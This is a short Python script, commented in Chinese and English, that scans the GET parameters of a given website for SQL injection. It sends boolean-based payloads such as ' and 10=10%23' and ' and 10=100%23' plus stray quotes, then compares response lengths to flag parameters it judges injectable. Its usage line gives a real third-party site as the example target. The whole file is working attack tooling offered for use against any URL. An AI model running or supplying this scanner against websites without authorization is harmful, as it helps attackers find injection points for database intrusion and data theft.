#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:Noel
#Test SQL Injection For A Specifically Website
#测试特定网站是否存在SQL注入
#GET型
import requests
import sys

header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'
}
#SQL注入主程序
def Scan(url):
    print('Scan ' + url + '...')
    if 'http' not in url:
        url = 'http://' + url
    params = url.split('?')[1].split('&')
    try:
        origin = len(requests.get(url,timeout=1,headers=header).text)
        for i in params:
            if sqlTrue(url,origin,i):
                if sqlFalse(url,origin,i):
                    print('[!!] Find Injection：'+ url+' Param: '+i)
    except:
        print("[-]Connetcion Error!")
    print('[+]Scan End.')

#输出正常的SQL注入语句
def sqlTrue(url,origin,param):
    payload = [' and 10=10%23','%23','%0A','\'%23']
    error_count = 0
    for i in payload:
        length = len(requests.get(url.replace(param,param+i),timeout=0.5,headers=header).text)
        if length < origin-30 or length > origin+30:
            error_count += 1
    print("True: "+str(error_count))
    if error_count >= 2:
        return 0
    return 1

#输出错误的SQL注入语句
def sqlFalse(url,origin,param):
    payload = ['a',' and 10=100%23','\'']
    error_count = 0
    for i in payload:
        length = len(requests.get(url.replace(param,param+i),timeout=0.5,headers=header).text)
        #print(url.replace(param,param+i))
        if origin-10 <= length <= origin+10:
            error_count += 1
    print("False: "+str(error_count))
    if error_count >= 2:
        return 0
    return 1

#输出提示信息
def Usage():
    print('[INFO]   '+sys.argv[0]+' <target url>')
    print('EXAMPLE: '+sys.argv[0]+' \"http://www.baidu.com?id=1\"')
    exit()


def main():
    #读取目标网站
    try:
        Target = sys.argv[1]
    except:
    #格式不正确输出提示信息
        Usage()
    #进行注入测试
    Scan(Target)

if __name__ == '__main__':
    main()
